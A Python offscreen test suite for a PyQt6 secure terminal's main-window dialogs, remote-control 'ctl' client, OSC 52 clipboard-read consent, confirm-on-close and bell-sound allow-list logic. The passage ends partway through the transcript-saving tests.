#!/usr/bin/python3 -Bsu
## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

## Tests for secure_terminal.main's window-level dialogs and the `ctl`
## remote-control client. Kept as its own small offscreen suite -- rather than
## folded into the large widget suite -- because a second long-lived MainWindow
## plus its modal dialogs perturbs the big suite's Qt teardown; here the window
## is built, exercised and destroyed in isolation. The modal dialogs are shown
## with QDialog.exec() stubbed (Accepted/Rejected) so nothing blocks, and the
## ctl client is driven with ipc.send_request stubbed to canned replies.
## Fails closed (exit 1) if a required dependency is missing -- deps are hard.

import os
import sys
import threading
import time

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
# Pin the font DPI to 72 BEFORE any QApplication so font metrics are deterministic
# by default. The responsive-toolbar tier assertions below are calibrated to the
# real compositor's ~9pt metrics; bare offscreen defaults to a different DPI (a
# larger 12pt), which widens the toolbar tiers and breaks the 'labeled'-default
# calibration. The secure-terminal-tests / -coverage runners export this before
# python starts (the authoritative safe path); this setdefault is the fallback
# for a direct `python3 test_mainwin.py` run, and honours an explicit override
# (e.g. a real-compositor run) either way.
os.environ.setdefault('QT_FONT_DPI', '72')

try:
    from PyQt6.QtWidgets import QApplication, QDialog
    import secure_terminal.main as M
    from secure_terminal.main import MainWindow, _ctl_main
except Exception as exc:  # fail closed: a required dependency must not silently skip
    sys.stderr.write('secure-terminal-tests: FAIL missing dependency: '
                     '%s\n' % exc)
    sys.exit(1)

APP = QApplication.instance() or QApplication([])

# _require_default_font (main) aborts startup with exit 1 when the default font
# (Hack / fonts-hack, a hard dependency) is absent, so Qt cannot silently
# substitute a fallback that reintroduces confusable glyphs / ligatures. fonts-hack
# need not be installed in the test environment, so every full-startup test pins
# the check present via this fake QFontDatabase; the dedicated _require_default_font
# test drives both branches AND the real families() API (to catch an API break).
_REAL_QFONTDB = M.QFontDatabase


class _FontDBPresent:
    @staticmethod
    def families():
        return [M.DEFAULT_FONT_FAMILY, 'DejaVu Sans Mono']

# Isolate config/state so the window loads clean defaults regardless of what any
# earlier suite (run in the same coverage batch) may have written to the real
# drop-in dirs -- keeps this suite deterministic in any run order.
import tempfile                                                # noqa: E402
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp()
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp()
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()   # single-instance socket dir

_failures = 0


def ok(cond, msg):
    global _failures
    if cond:
        print('ok   %s' % msg)
    else:
        _failures += 1
        print('FAIL: %s' % msg)


def eq(got, want, msg):
    ok(got == want, '%s (got %r, want %r)' % (msg, got, want))


def pump(ms=10):
    """Process pending Qt events, then briefly yield so a just-forked child can
    reach its chdir/exec before the next poll, without busy-spinning. Used by the
    cwd-restore poll below; reachable only when the child is not ready on the
    first try, so it must always be defined (not left to a startup-timing race)."""
    APP.processEvents()
    time.sleep(ms / 1000.0)
    APP.processEvents()


# The app icon is env-dependent: a desktop with an icon theme resolves one, but
# a bare CI container (no theme, no installed icon) yields a null QIcon, so the
# "icon present" branches in show_about() and main() would go uncovered there.
# Force a real icon so those branches run deterministically; the _app_icon tests
# below use the saved original to exercise the real (themed / null) resolution.
_REAL_APP_ICON = M._app_icon
M._app_icon = lambda: M._letter_icon('S', '#336699')

win = MainWindow()
win.new_tab()

# The shipped default theme is LIGHT (white bg): a window with no theme configured
# comes up light, and its tabs render on the light base.
eq(win._default_theme, 'light',
   'default theme is light when nothing is configured')
ok(win.current().current_theme() == 'light',
   'a tab of a freshly-defaulted window is light')
# escape_limit defaults to 4096 when nothing is configured (the freeze bound is on)
eq(win._escape_limit, 4096,
   'default escape_limit is 4096 when nothing is configured')
eq(win.current().current_escape_limit(), 4096,
   'a freshly-defaulted tab carries the 4096 escape-limit bound')

# --- window dialogs: built and shown with exec() stubbed ----------------------
from PyQt6.QtWidgets import QFormLayout as _QFL                 # noqa: E402


def _dlg_field(dlg, label_text):
    # the field widget on the form row whose label contains label_text (labels
    # carry an "(i)" HTML marker, so match by substring, not equality).
    for _form in dlg.findChildren(_QFL):
        for _r in range(_form.rowCount()):
            _l = _form.itemAt(_r, _QFL.ItemRole.LabelRole)
            _f = _form.itemAt(_r, _QFL.ItemRole.FieldRole)
            if _l and _f and _l.widget() is not None \
               and label_text in _l.widget().text():
                return _f.widget()
    return None


_orig_exec = QDialog.exec
_dialogs = []
def _accept_exec(_self):
    _dialogs.append(_self)
    return int(QDialog.DialogCode.Accepted)
QDialog.exec = _accept_exec
try:
    win.show_about()
    ok(True, 'show_about builds and shows')
    win.show_locations()
    ok(True, 'show_locations builds and shows the paths dialog')
    win.show_global_settings()
    ok(True, 'show_global_settings applies the chosen defaults on accept')
    # the paste-delay combo must SHOW the current value, even when it is not one of
    # the presets (config allows any 0-60); a blank selection was confusing.
    from PyQt6.QtWidgets import QComboBox as _QCbD              # noqa: E402
    win._paste_delay = 7
    _dialogs.clear()
    win.show_global_settings()
    _pd = [c for c in _dialogs[-1].findChildren(_QCbD) if c.findData(7) >= 0]
    ok(bool(_pd) and _pd[0].currentData() == 7 and _pd[0].currentText() == '7 seconds',
       'settings: a non-preset paste delay (7s) shows in the combo, not a blank')
    # likewise the escape-limit combo SHOWS a non-preset config value (any 0+ is
    # valid), not a blank selection.
    win._escape_limit = 12345
    _dialogs.clear()
    win.show_global_settings()
    _el = _dlg_field(_dialogs[-1], 'Suppressed-output notice')
    ok(_el is not None and _el.currentData() == 12345
       and _el.currentText() == 'After 12345 characters',
       'settings: a non-preset escape limit (12345) shows in the combo, not a blank')
    win._escape_limit = 4096
    # #79: every settings input has a tooltip; every tipped label shows the "(i)"
    # indicator so it is visible a (copyable) tooltip is available.
    from PyQt6.QtWidgets import (QCheckBox as _QCbx79, QSpinBox as _QSpn79,  # noqa: E402
                                 QLabel as _QLbl79)
    _sd79 = _dialogs[-1]
    _fields79 = _sd79.findChildren((_QCbD, _QCbx79, _QSpn79))
    ok(len(_fields79) >= 10 and all(f.toolTip() for f in _fields79),
       '#79: every settings input field has a tooltip')
    _lbls79 = [l for l in _sd79.findChildren(_QLbl79) if l.toolTip()]
    ok(len(_lbls79) >= 9 and all('(i)' in l.text() for l in _lbls79),
       '#79: every tipped settings label shows the (i) indicator')
    win._paste_delay = 3
    _dialogs.clear()
    # every dialog's descriptive text must be selectable so it can be copied
    from PyQt6.QtWidgets import QLabel as _QLabelD           # noqa: E402
    from PyQt6.QtCore import Qt as _QtD                      # noqa: E402
    _seld = _QtD.TextInteractionFlag.TextSelectableByMouse
    for _dlg in _dialogs:
        _dlabels = _dlg.findChildren(_QLabelD)
        ok(bool(_dlabels) and all(l.textInteractionFlags() & _seld
                                  for l in _dlabels),
           'dialog "%s" labels are all selectable/copyable' % _dlg.windowTitle())
    QDialog.exec = lambda _self: int(QDialog.DialogCode.Rejected)
    win.show_global_settings()
    ok(True, 'show_global_settings: cancel returns without applying')
    # #125: the settings dialog Ctrl+wheel live-zooms the chrome (UI) scale.
    from secure_terminal.main import _ZoomDialog as _ZD           # noqa: E402
    from PyQt6.QtGui import QWheelEvent as _QWE                   # noqa: E402
    from PyQt6.QtCore import QPointF as _QPF, QPoint as _QP       # noqa: E402
    win._ui_scale = 100                       # deterministic sub-max start so a step MUST raise it
    _us0 = win._ui_scale
    QDialog.exec = _accept_exec
    _dialogs.clear()
    win.show_global_settings()
    _zdlg = [d for d in _dialogs if isinstance(d, _ZD)][-1]
    _zdlg.on_zoom(1)                          # covers _live_zoom (step + live re-scale)
    ok(win._ui_scale > _us0,
       'Ctrl+wheel up on the settings dialog raises the menu scale live')
    _zoomed = []
    _zdlg.on_zoom = lambda direction: _zoomed.append(direction)

    def _wheel(mod, dy):
        return _QWE(_QPF(1, 1), _QPF(1, 1), _QP(0, 0), _QP(0, dy),
                    _QtD.MouseButton.NoButton, mod,
                    _QtD.ScrollPhase.NoScrollPhase, False)
    _zdlg.wheelEvent(_wheel(_QtD.KeyboardModifier.ControlModifier, 120))
    _zdlg.wheelEvent(_wheel(_QtD.KeyboardModifier.NoModifier, 120))
    eq(_zoomed, [1],
       'Ctrl+wheel steps the zoom; a plain wheel scrolls without zooming')
    win._ui_scale = _us0
    # a locked ui_scale refuses the live Ctrl+wheel scale (else a locked chrome
    # size is changeable for the session, though _persist drops it from disk).
    _sl_uiz = set(win._locked)
    win._locked = {'ui_scale'}
    _us_lk = win._ui_scale
    _dialogs.clear()
    win.show_global_settings()
    _zlk = [d for d in _dialogs if isinstance(d, _ZD)][-1]
    _zlk.on_zoom(1)
    eq(win._ui_scale, _us_lk,
       'a locked ui_scale ignores the settings-dialog Ctrl+wheel live zoom')
    # a locked key disables its Global Settings control, so it cannot be edited
    # into a value _apply_global then silently discards. Every control asserted
    # here was ungated before the table-driven disable loop.
    win._locked = {'theme', 'scrollback', 'persist_session', 'unicode_mode',
                   M.OSC_FEATURES[0][0]}
    _dialogs.clear()
    win.show_global_settings()
    _gs = _dialogs[-1]
    # collect first so a not-found field fails the ok() gracefully rather than
    # raising AttributeError on None.isEnabled() (e.g. if a label is renamed).
    _locked_ctls = [_dlg_field(_gs, _lbl) for _lbl in
                    ('Theme', 'Scrollback', 'Restore session on start',
                     'Unicode', 'OSC ' + M.OSC_FEATURES[0][1])]
    ok(all(_c is not None and not _c.isEnabled() for _c in _locked_ctls),
       'a locked global-settings key disables its dialog control')
    win._locked = _sl_uiz
finally:
    QDialog.exec = _orig_exec

# --- the `secure-terminal ctl ...` remote-control client (_ctl_main) -----------
_orig_sr = M.ipc.send_request
try:
    M.ipc.send_request = lambda *_a, **_k: None
    eq(_ctl_main(['ls']), 1, 'ctl ls: no running instance -> exit 1')
    M.ipc.send_request = lambda *_a, **_k: {'ok': False, 'error': 'denied'}
    eq(_ctl_main(['ls']), 1, 'ctl ls: an error reply -> exit 1')
    M.ipc.send_request = lambda *_a, **_k: {
        'ok': True, 'tabs': [{'id': 1, 'title': 'one', 'tui': True},
                             {'id': 2, 'title': 'two'}]}
    eq(_ctl_main(['ls']), 0, 'ctl ls: lists tabs -> exit 0')
    M.ipc.send_request = lambda *_a, **_k: {'ok': True}
    eq(_ctl_main(['send-text', '--tab', 'id:1', 'hi\n']), 0, 'ctl send-text -> 0')
    eq(_ctl_main(['set-tab-title', '--tab', 'id:1', 'Renamed']), 0,
       'ctl set-tab-title -> 0')
    M.ipc.send_request = lambda *_a, **_k: {'ok': True, 'text': 'rendered text'}
    eq(_ctl_main(['dump-tab', '--tab', 'title:one', '--lines', '5']), 0,
       'ctl dump-tab -> 0')
    # COR-7 client half: --lines 0 must be FORWARDED (0 is falsy, the base guard dropped it).
    _sent0: dict[str, object] = {}
    def _cap_req(*_a, **_k):
        for _x in _a:
            if isinstance(_x, dict) and 'op' in _x:
                _sent0.clear()
                _sent0.update(_x)
        return {'ok': True, 'text': ''}
    M.ipc.send_request = _cap_req
    eq(_ctl_main(['dump-tab', '--tab', 'title:one', '--lines', '0']), 0,
       'ctl dump-tab --lines 0 -> 0')
    ok(_sent0.get('lines') == 0,
       'COR-7: the client forwards --lines 0 (not dropped as a falsy value)')
    # zoom: forwards the tab + level and prints the returned zoom.
    _sentz: dict[str, object] = {}
    def _cap_reqz(*_a, **_k):
        for _x in _a:
            if isinstance(_x, dict) and 'op' in _x:
                _sentz.clear()
                _sentz.update(_x)
        return {'ok': True, 'zoom': 150}
    M.ipc.send_request = _cap_reqz
    eq(_ctl_main(['zoom', '--tab', 'id:1', '150']), 0, 'ctl zoom -> 0')
    ok(_sentz.get('op') == 'ctl-zoom' and _sentz.get('tab') == 'id:1'
       and _sentz.get('level') == '150',
       'ctl: the client builds the ctl-zoom request (tab + level forwarded)')
finally:
    M.ipc.send_request = _orig_sr

# --- clipboard-read (OSC 52) request dialog: countdown + a choice -------------
from PyQt6.QtWidgets import QPushButton                         # noqa: E402
from PyQt6.QtCore import QEventLoop, QTimer                     # noqa: E402

term = win.tabs.currentWidget()
win._paste_delay = 2                       # secs=2 so the countdown _tick loops


def _exec_clip(self):
    # let the 1s countdown _tick fire a couple of times (covers both branches),
    # then click "Allow once" to drive _choose.
    loop = QEventLoop()
    QTimer.singleShot(2300, loop.quit)
    loop.exec()
    for _b in self.findChildren(QPushButton):
        if _b.text().startswith('Allow once'):
            _b.click()
            break
    return int(QDialog.DialogCode.Accepted)


QDialog.exec = _exec_clip
_clip_grants = []
_orig_grant = term.grant_clipboard_read
term.grant_clipboard_read = lambda d: _clip_grants.append(d)
try:
    win._on_clipboard_read_requested(term)
    # non-vacuous: clicking "Allow once" must record the ONCE decision on the tab
    # (post-exec the window calls term.grant_clipboard_read(result['decision'])).
    ok(_clip_grants == [term.CLIP_ALLOW_ONCE],
       'clipboard-read dialog: countdown enables Allow, the once-allow choice is recorded')
finally:
    term.grant_clipboard_read = _orig_grant
    QDialog.exec = _orig_exec

# REGRESSION (finding #3): a BACKGROUND tab's OSC-52 read must NOT pop a consent dialog
# over the focused tab (context-confusion -- the user could approve believing it is the
# tab they are looking at). It is denied-once WITHOUT a prompt, which resets the tab to
# un-decided so a later read (once focused) asks properly. CANARY: the pre-fix handler
# popped the modal for any tab -> _exec_should_not_run runs and grants ALLOW_ONCE.
_bg_grants = []
_bg_exec_calls = [0]
def _exec_should_not_run(self):
    _bg_exec_calls[0] += 1
    for _b in self.findChildren(QPushButton):
        if _b.text().startswith('Allow once'):
            _b.click()
            break
    return int(QDialog.DialogCode.Accepted)
_bg_orig_grant = term.grant_clipboard_read
_bg_orig_current = win.current
term.grant_clipboard_read = lambda d: _bg_grants.append(d)
QDialog.exec = _exec_should_not_run
win.current = lambda: None                   # make `term` a non-current (background) tab
try:
    win._on_clipboard_read_requested(term)
    ok(_bg_exec_calls[0] == 0,
       'OSC-52 background tab: no consent dialog is shown over the focused tab (#3)')
    ok(_bg_grants == [term.CLIP_DENY_ONCE],
       'OSC-52 background tab: denied-once without a prompt, tab reset to re-askable (#3)')
finally:
    win.current = _bg_orig_current
    term.grant_clipboard_read = _bg_orig_grant
    QDialog.exec = _orig_exec

# REGRESSION (finding #2): a second "Review clipboard now" while the first popup is still
# open must NOT reassign self._clip_reviewer -- that would GC the first, unresolved popup
# and silently discard its pending review. The guard re-raises the existing one instead.
# CANARY: the pre-fix _clip_review_now always built a new watcher, so _clip_reviewer would
# change identity on the second call.
APP.clipboard().setText('review me once')
win._clip_review_now()
_clip_r1 = win._clip_reviewer
ok(_clip_r1 is not None and _clip_r1.review_is_open(),
   'clip review now: the first invocation opens a review popup')
win._clip_review_now()                       # second call while the first is still open
ok(win._clip_reviewer is _clip_r1,
   'clip review now: a second call re-raises the SAME reviewer, not a new one (#2)')
_clip_r1.resolve('review me once', 'reject')  # resolve so the popup closes
ok(not _clip_r1.review_is_open(), 'clip review now: the review resolves cleanly')

# --- keyboard-shortcuts dialog: build, Reset, Save ----------------------------
def _exec_shortcuts(self):
    for _b in self.findChildren(QPushButton):
        if _b.text() == 'Reset to defaults':
            _b.click()                     # fires _do_reset
    for _b in self.findChildren(QPushButton):
        if _b.text() == 'Save':
            _b.click()                     # fires _do_save -> accept on success
    return int(QDialog.DialogCode.Accepted)


_ss_saved = []
_o_set_sc = win._set_shortcuts
def _spy_set_shortcuts(_m):                  # spy the Save path
    _ss_saved.append(_m)
    return _o_set_sc(_m)
win._set_shortcuts = _spy_set_shortcuts
QDialog.exec = _exec_shortcuts
try:
    win.show_shortcuts()
    ok(bool(_ss_saved),
       'show_shortcuts: clicking Save applies the bindings via _set_shortcuts')
finally:
    QDialog.exec = _orig_exec
    win._set_shortcuts = _o_set_sc

# locked keybindings: the key editors + Reset/Save are shown read-only (disabled).
# The lock is saved+restored in the finally: it MUST NOT leak into the ~2200 later
# tests (a leaked 'keybindings' lock makes _set_shortcuts early-return the lock
# message, silently masking the reserved/duplicate detection those tests assert).
_sk_lock_save = set(win._locked)
win._locked = set(win._locked) | {'keybindings'}
_sk_dlg = []
def _exec_capture_ro(_self):
    _sk_dlg.append(_self)                    # capture the dialog to inspect its widgets
    return int(QDialog.DialogCode.Rejected)
QDialog.exec = _exec_capture_ro
try:
    win.show_shortcuts()
    from PyQt6.QtWidgets import QKeySequenceEdit as _QKSE          # noqa: E402
    _sk_edits = _sk_dlg[0].findChildren(_QKSE) if _sk_dlg else []
    ok(bool(_sk_edits) and all(not _e.isEnabled() for _e in _sk_edits),
       'show_shortcuts: admin-locked bindings render the key editors read-only (disabled)')
finally:
    QDialog.exec = _orig_exec
    win._locked = _sk_lock_save              # restore -- never leak the lock forward

from secure_terminal.main import _test_canary                     # noqa: E402
from PyQt6.QtWidgets import (QFileDialog, QMenu, QMessageBox)      # noqa: E402
from PyQt6.QtCore import QPoint                                    # noqa: E402

# A modal must never be reachable in this user-less harness: QMessageBox.question
# BLOCKS in the event loop with nobody to answer, and the suite hangs forever
# (observed: 1h25m in poll, single-threaded, right here). close_tab asks it via
# _confirm_running_close whenever a tab reports a foreground program, which a
# freshly spawned shell can do transiently -- so the auto-answer must be armed
# before the first close_tab call in this module runs.
from PyQt6.QtWidgets import QMessageBox as _QMB_early           # noqa: E402

_QMB_early.question = staticmethod(
    lambda *_a, **_k: _QMB_early.StandardButton.Yes)

# --- close_tab (on a throwaway window so emptying it is harmless) --------------
w2 = MainWindow()
w2.new_tab()
w2.new_tab()
_n0 = w2.tabs.count()
w2.close_tab(999)                           # out-of-range -> no-op
ok(w2.tabs.count() == _n0, 'close_tab: an out-of-range index is a no-op')
w2.close_tab(0)
ok(w2.tabs.count() == _n0 - 1, 'close_tab: removes the tab at the given index')
while w2.tabs.count() > 0:                   # last close empties + closes window
    w2.close_tab(0)
ok(w2.tabs.count() == 0, 'close_tab: closing the last tab empties the window')
w2.deleteLater()

# _on_shell_exited: a -- PROGRAM tab drops to a fresh login shell in place when the
# program exits (not closed); a plain login-shell tab closes. Pre-fix, BOTH closed.
_rw = MainWindow()
_rw.new_tab(command=['/bin/sh', '-c', 'exit 0'])     # a program tab that exits at once
_rw_term = _rw.tabs.widget(_rw.tabs.count() - 1)
_rw_before = _rw.tabs.count()
_deadline = time.time() + 5
while time.time() < _deadline and _rw_term._command is not None:
    pump(30)                                         # child exit -> shell_exited -> restart
ok(_rw.tabs.count() == _rw_before and _rw_term._command is None,
   'a -- PROGRAM tab that exits restarts as a shell in place, not closed')
_rw.new_tab()                                        # a plain login-shell tab
_rw_login = _rw.tabs.widget(_rw.tabs.count() - 1)
_rw_c0 = _rw.tabs.count()
_rw._on_shell_exited(_rw_login)                      # simulate its shell exiting
ok(_rw.tabs.count() == _rw_c0 - 1,
   'a plain login-shell tab closes when its shell exits')
while _rw.tabs.count() > 0:
    _rw.close_tab(0)
_rw.deleteLater()

# launch_command is the --reuse dedup key (a running program's window is reused, not
# re-opened). When a -- PROGRAM tab restarts to a plain shell it no longer runs that
# program, so the key MUST clear -- else a later --reuse of the same command wrongly
# folds into this now-a-shell tab instead of opening a fresh one.
_lw = MainWindow()
_lw.new_tab(command=['/bin/sh', '-c', 'exit 0'])
_lw_term = _lw.tabs.widget(_lw.tabs.count() - 1)
_lw_term.launch_command = ('/bin/sh', '-c', 'exit 0')     # as a --reuse launch would set it
_deadline = time.time() + 5
while time.time() < _deadline and _lw_term._command is not None:
    pump(30)
ok(_lw_term._command is None
   and getattr(_lw_term, 'launch_command', 'unset') is None,
   'restart clears launch_command so a later --reuse opens a fresh tab, not this shell')
while _lw.tabs.count() > 0:
    _lw.close_tab(0)
_lw.deleteLater()

# F2: closing a tab that holds a paste/copy review hides the bar first, so its
# buttons cannot dispatch onto the destroyed terminal (RuntimeError).
_fw = MainWindow()
_fw.new_tab()
_ft = _fw.current()
_fw._review_bar.show_review(_ft, 'risky text', 0, 'paste')
ok(_fw._review_bar.reviewed_term() is _ft, 'F2: the review bar tracks the reviewed tab')
_fw.close_tab(_fw.tabs.indexOf(_ft))
ok(_fw._review_bar.reviewed_term() is None,
   'F2: closing the reviewed tab hides its review bar (no dangling terminal)')
_fw.deleteLater()

# --- confirm-close when a tab/window still runs a foreground program -----------
from PyQt6.QtGui import QCloseEvent                              # noqa: E402
_Yes, _No = QMessageBox.StandardButton.Yes, QMessageBox.StandardButton.No
# Default every confirm-on-close dialog to "Yes" (quit) so incidental window
# closes in this user-less harness never block on the modal. A `-- PROGRAM` tab
# now counts as a running program, so closing any window that holds one pops the
# confirm dialog; a window closed OUTSIDE an explicit confirm-close test below
# would otherwise hang. The explicit tests set their own mock and restore to THIS
# default (captured as _oq), not the real modal, so the guarantee survives them.
QMessageBox.question = staticmethod(lambda *_a, **_k: _Yes)
w3 = MainWindow()
w3.new_tab()
_t3 = w3.current()
ok(w3._confirm_close is True, 'confirm-close: on by default')
w3.set_confirm_close(False)
ok(w3._confirm_close is False and not w3.act_confirm_close.isChecked(),
   'confirm-close: the setter toggles the flag and the menu action')
w3.set_confirm_close(True)
_oq = QMessageBox.question
_asked: list[int] = []
def _deny_question(*_a, **_k):
    _asked.append(1)
    return _No
try:
    # setting off -> never asks, even with a program running
    w3._confirm_close = False
    _t3.has_foreground_program = lambda: True
    _asked.clear()
    QMessageBox.question = staticmethod(_deny_question)
    ok(w3._confirm_running_close('t', 'q', [_t3]) and not _asked,
       'confirm-close off: proceeds without asking, program or not')
    # on, but nothing running -> no prompt
    w3._confirm_close = True
    _t3.has_foreground_program = lambda: False
    _asked.clear()
    ok(w3._confirm_running_close('t', 'q', [_t3]) and not _asked,
       'confirm-close on, nothing running: proceeds without asking')
    # on + running + declined -> abort; accepted -> proceed
    _t3.has_foreground_program = lambda: True
    _asked.clear()
    QMessageBox.question = staticmethod(_deny_question)
    ok(not w3._confirm_running_close('t', 'q', [_t3]) and _asked,
       'confirm-close on, running, declined: aborts')
    QMessageBox.question = staticmethod(lambda *_a, **_k: _Yes)
    ok(w3._confirm_running_close('t', 'q', [_t3]),
       'confirm-close on, running, accepted: proceeds')
    # close_tab honours the decision
    _n = w3.tabs.count()
    QMessageBox.question = staticmethod(lambda *_a, **_k: _No)
    w3.close_tab(w3.tabs.indexOf(_t3))
    eq(w3.tabs.count(), _n, 'close_tab: a running tab is kept when declined')
    QMessageBox.question = staticmethod(lambda *_a, **_k: _Yes)
    w3.close_tab(w3.tabs.indexOf(_t3))
    eq(w3.tabs.count(), _n - 1, 'close_tab: the running tab closes when confirmed')
    # Reentrancy: the confirm modal spins a NESTED loop, during which _on_shell_exited
    # (the program exiting, via the pty notifier) re-enters close_tab for THIS SAME term.
    # Without the _closing_tabs guard the reentrant call runs the confirm again (here the
    # mock would re-enter forever -> RecursionError) and both invocations would
    # shutdown()+removeTab()+deleteLater() the same term -- the second deleteLater
    # double-frees the C++ object and crashes live. Guarded, the reentrant call is a
    # no-op; the tab closes exactly once. Simulate the reentrancy from inside the modal.
    w3.new_tab()
    _rt = w3.current()
    _rt.has_foreground_program = lambda: True
    _rt.shutdown = lambda: None               # avoid the offscreen ipc-reaper race
    _n2 = w3.tabs.count()
    _guarded = []
    def _reentrant_question(*_a, **_k):
        w3.close_tab(w3.tabs.indexOf(_rt))     # reentrant close of the same term
        _guarded.append(_rt in w3._closing_tabs)
        return _Yes
    QMessageBox.question = staticmethod(_reentrant_question)
    w3.close_tab(w3.tabs.indexOf(_rt))
    ok(_guarded == [True],
       'close_tab: a term stays guarded across the confirm modal (reentrancy blocked)')
    eq(w3.tabs.count(), _n2 - 1,
       'close_tab: a reentrant close during the modal removes the tab exactly once')
    ok(_rt not in w3._closing_tabs,
       'close_tab: the closing mark is cleared once the close completes')
    # Cancel-after-child-exit: if the shell EXITS during the confirm modal, its
    # _on_shell_exited -> close_tab re-entry is swallowed by the _closing_tabs guard, so a
    # plain Cancel would strand a tab with a DEAD child (the auto-close was lost). close_tab
    # must detect the mid-modal exit and close anyway. Simulate: emit shell_exited from
    # inside the modal, then decline. FAILS pre-fix (the declined tab is kept, child dead).
    w3.new_tab()
    _xt = w3.current()
    _xt.has_foreground_program = lambda: True
    _xt.shutdown = lambda: None
    _n3 = w3.tabs.count()
    def _exit_then_decline(*_a, **_k):
        w3._on_shell_exited(_xt)               # the shell dies while the dialog is up
        return _No                             # ... and the user then clicks No
    QMessageBox.question = staticmethod(_exit_then_decline)
    w3.close_tab(w3.tabs.indexOf(_xt))
    eq(w3.tabs.count(), _n3 - 1,
       'close_tab: a shell exiting DURING the confirm modal closes the tab even on Cancel')
    ok(_xt not in w3._closing_tabs and _xt not in w3._shell_exited_pending,
       'close_tab: both close marks are cleared after a mid-modal-exit close')
    # Cancel-after-child-exit, -- PROGRAM tab: same mid-modal exit, but the tab ran a
    # specific program. Its disposition on exit is RESTART (not close), so a Cancel here
    # must run the deferred restart -- dropping to a fresh shell in place -- not close the
    # tab. FAILS pre-fix (the command tab is closed like a login shell). Uses a real
    # short-lived child so restart_as_shell has a live pty to respawn from.
    w3.new_tab(command=['/bin/sh', '-c', 'sleep 30'])
    _ct = w3.current()
    _ct.launch_command = ('/bin/sh', '-c', 'sleep 30')
    _n4 = w3.tabs.count()
    def _cmd_exit_then_decline(*_a, **_k):
        w3._on_shell_exited(_ct)                       # the program dies while the dialog is up
        return _No                                     # ... and the user then clicks No
    _ct.has_foreground_program = lambda: True
    QMessageBox.question = staticmethod(_cmd_exit_then_decline)
    w3.close_tab(w3.tabs.indexOf(_ct))
    pump(200)
    eq(w3.tabs.count(), _n4,
       'close_tab: a -- PROGRAM tab whose program exits during the modal RESTARTS on Cancel')
    ok(_ct._command is None and getattr(_ct, 'launch_command', 'unset') is None
       and _ct not in w3._closing_tabs and _ct not in w3._shell_exited_pending,
       'close_tab: the cancelled command tab is a fresh shell with its close marks cleared')
    # cleanup: _ct is now a fresh shell -- ACTUALLY close it. Reset both stubs first:
    # left as-is, the stale declining closure (has_foreground_program True + question
    # -> No) would resurrect _ct, so this close silently no-ops and leaks the tab AND
    # every later question() in the file runs the stale closure. A no-fg shell closes
    # with no modal.
    _ct.has_foreground_program = lambda: False
    QMessageBox.question = staticmethod(lambda *_a, **_k: _No)
    _n_cleanup = w3.tabs.count()
    w3.close_tab(w3.tabs.indexOf(_ct))
    pump(200)
    eq(w3.tabs.count(), _n_cleanup - 1,
       'close_tab: the cleaned-up fresh shell actually closes (no stale declining stub)')
    # _on_shell_exited on an already-removed tab is a harmless no-op (index == -1).
    w3._on_shell_exited(_xt)
    # closeEvent: a running program + decline ignores the window close
    w3.new_tab()
    w3.current().has_foreground_program = lambda: True
    QMessageBox.question = staticmethod(lambda *_a, **_k: _No)
    _ev = QCloseEvent()
    w3.closeEvent(_ev)
    ok(not _ev.isAccepted(), 'closeEvent: running program + decline ignores the close')
    # _force_close (a signal-driven / programmatic quit) accepts the close even
    # with a program running, WITHOUT opening the modal: the confirmation needs a
    # user, and a modal run during XCB teardown segfaults. The mock would decline
    # if asked, so an accepted close proves the prompt was skipped. This checks the
    # guard decision only -- tab shutdown is stubbed so the real SIGHUP/SIGCHLD
    # teardown (exercised in the aboutToQuit test) does not fire mid-suite and feed
    # the known offscreen ipc-reaper race.
    w3._persist_session = False              # clear, don't write a bogus session
    for _i in range(w3.tabs.count()):
        w3.tabs.widget(_i).has_foreground_program = lambda: True
        w3.tabs.widget(_i).shutdown = lambda: None
    w3._force_close = True
    _asked.clear()
    QMessageBox.question = staticmethod(_deny_question)
    _ev_fc = QCloseEvent()
    _ev_fc.ignore()                          # start REJECTED so only an explicit accept passes
    w3.closeEvent(_ev_fc)
    ok(_ev_fc.isAccepted() and not _asked,
       'closeEvent: _force_close accepts the close without prompting')
    w3._force_close = False
finally:
    QMessageBox.question = _oq
w3.deleteLater()

# --- tab context menu (exec stubbed) ------------------------------------------
_ome = QMenu.exec
QMenu.exec = lambda *_a, **_k: None
try:
    _pt = win.tabs.tabBar().tabRect(0).center()
    win._tab_context_menu(_pt)
    ok(True, 'tab context menu: builds over a tab')
    win._tab_context_menu(QPoint(9999, 9999))
    ok(True, 'tab context menu: no tab under the point -> no-op')
finally:
    QMenu.exec = _ome

# --- bell-sound picker (file dialog + allow-list gate, stubbed) ---------------
_owarn = QMessageBox.warning
_ogof = QFileDialog.getOpenFileName
_bell_warns = []
QMessageBox.warning = staticmethod(lambda *_a, **_k: _bell_warns.append(1))
_bell_set = []
_orig_set_bell = win.set_bell_sound
win.set_bell_sound = lambda p: _bell_set.append(p)
_orig_locked = win._bell_sound_locked
try:
    win._bell_sound_locked = lambda: True
    _bell_warns.clear(); _bell_set.clear()
    win._pick_bell_sound()                  # locked -> return before the dialog
    ok(not _bell_set and not _bell_warns,
       '_pick_bell_sound: a locked setting sets no sound and shows no warning')
    win._bell_sound_locked = lambda: False
    QFileDialog.getOpenFileName = staticmethod(lambda *_a, **_k: ('', ''))
    _bell_warns.clear(); _bell_set.clear()
    win._pick_bell_sound()                  # cancelled -> return
    ok(not _bell_set and not _bell_warns,
       '_pick_bell_sound: cancelling the dialog sets no sound and shows no warning')
    QFileDialog.getOpenFileName = staticmethod(
        lambda *_a, **_k: ('/etc/hostname', ''))   # a real file, not in the allow-list
    _bell_warns.clear(); _bell_set.clear()
    win._pick_bell_sound()                  # disallowed -> warning -> return
    ok(_bell_warns == [1] and not _bell_set,
       '_pick_bell_sound: a file outside the allowed dirs is refused (warns, sets nothing)')
finally:
    win._bell_sound_locked = _orig_locked
    win.set_bell_sound = _orig_set_bell
    QFileDialog.getOpenFileName = _ogof
    QMessageBox.warning = _owarn

# --- save_transcript (save dialog stubbed) ------------------------------------
_ogsf = QFileDialog.getSaveFileName
try:
    QFileDialog.getSaveFileName = staticmethod(lambda *_a, **_k: ('', ''))
    win.save_transcript()                   # cancelled -> return
    ok(True, 'save_transcript: cancelling the dialog is a no-op')
    _tfd, _tpath = tempfile.mkstemp(suffix='.txt')
